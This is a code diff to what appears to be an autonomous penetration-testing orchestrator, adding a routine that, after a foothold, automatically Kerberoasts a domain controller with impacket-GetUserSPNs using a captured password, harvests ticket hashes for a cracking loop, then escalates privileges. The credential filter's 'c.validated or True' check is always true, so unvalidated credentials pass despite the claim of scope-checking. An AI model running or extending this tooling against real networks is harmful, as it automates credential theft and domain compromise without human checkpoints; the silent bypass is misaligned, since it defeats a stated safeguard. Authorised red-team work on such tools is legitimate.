@@ -33,6 +33,16 @@ PHASE_ORDER = [Phase.RECON, Phase.ENUM, Phase.VULN]
 AUTO_EXPLOIT_ORDER = [Phase.RECON, Phase.ENUM, Phase.VULN, Phase.EXPLOIT, Phase.POST]
 
 
+def _subprocess_runner(argv: list[str], timeout: float) -> tuple[int, str, str]:
+    """Run an argv command, returning (code, stdout, stderr). Injectable for tests."""
+    import subprocess
+    try:
+        p = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
+        return p.returncode, p.stdout, p.stderr
+    except (OSError, subprocess.SubprocessError) as exc:
+        return -1, "", str(exc)
+
+
 class Orchestrator:
     def __init__(
         self,
@@ -239,7 +249,14 @@ class Orchestrator:
             self.emit("phase", f"== entering {phase.value} ==")
             self.state.save(self.state_path)
             if phase == Phase.POST and self.auto_exploit and self.session is not None:
+                # An AD credential in hand -> autonomously roast for more hashes,
+                # then escalate through the session.
+                self._autonomous_kerberoast()
                 self._autonomous_privesc()
+            elif phase == Phase.POST and self.auto_exploit:
+                # No session, but a domain credential may still let us roast.
+                self._autonomous_kerberoast()
+                await self.run_phase(max_steps=max_steps)
             else:
                 await self.run_phase(max_steps=max_steps)
                 # After the read-only probes, try to auto-establish a foothold from a
@@ -279,6 +296,49 @@ class Orchestrator:
                     self.state.save(self.state_path)
                     return
                 self.emit("note", f"auto-foothold {cve} did not land; foothold stays guided")
+
+    def _autonomous_kerberoast(self, *, runner=None) -> None:
+        """With a domain credential + a known DC, autonomously Kerberoast for hashes.
+
+        Fires impacket-GetUserSPNs against the DC using a validated password
+        credential, parses the recovered TGS/AS-REP hashes into new `kind="hash"`
+        credentials, and feeds them to the state so the crack loop can attack them.
+        Scope-checked and audited; no-ops quietly when the preconditions aren't met.
+        """
+        from ..analysis.kerberos import creds_from_roast, kerberoast_command, parse_roast
+
+        dc = next((h for h in self.state.hosts.values() if "dc" in h.tags), None)
+        if dc is None or not self.validator.scope.allows(dc.address):
+            return
+        domain = next((t.split(":", 1)[1] for t in dc.tags
+                       if t.startswith("domain:")), "")
+        cred = next((c for c in self.state.credentials
+                     if c.kind == "password" and c.username and c.secret
+                     and (c.validated or True)), None)
+        if not domain or cred is None:
+            return
+
+        argv = kerberoast_command(domain, dc.address, cred.username, cred.secret or "")
+        self.emit("run", f"autonomous Kerberoast on {dc.address} as {cred.username}")
+        self.audit.write("kerberoast", host=dc.address, user=cred.username, domain=domain)
+        runner = runner or _subprocess_runner
+        code, out, err = runner(argv, 180)
+        text = (out or "") + "\n" + (err or "")
+
+        existing_titles = {f.title for f in self.state.findings}
+        existing_secrets = {c.secret for c in self.state.credentials}
+        added = 0
+        for f in parse_roast(text, host=dc.address):
+            if f.title not in existing_titles:
+                self.state.add_finding(f)
+                self.emit("finding", f"[{f.severity.value}] {f.title}")
+                added += 1
+        for c in creds_from_roast(text):
+            if c.secret not in existing_secrets:
+                self.state.credentials.append(c)
+        if added:
+            self.emit("note", f"Kerberoast recovered {added} hash(es); crack loop can attack them")
+        self.state.save(self.state_path)
 
     def _autonomous_privesc_windows(self) -> None:
         """Windows counterpart of the autonomous privesc: WinRM enum + curated escalation."""
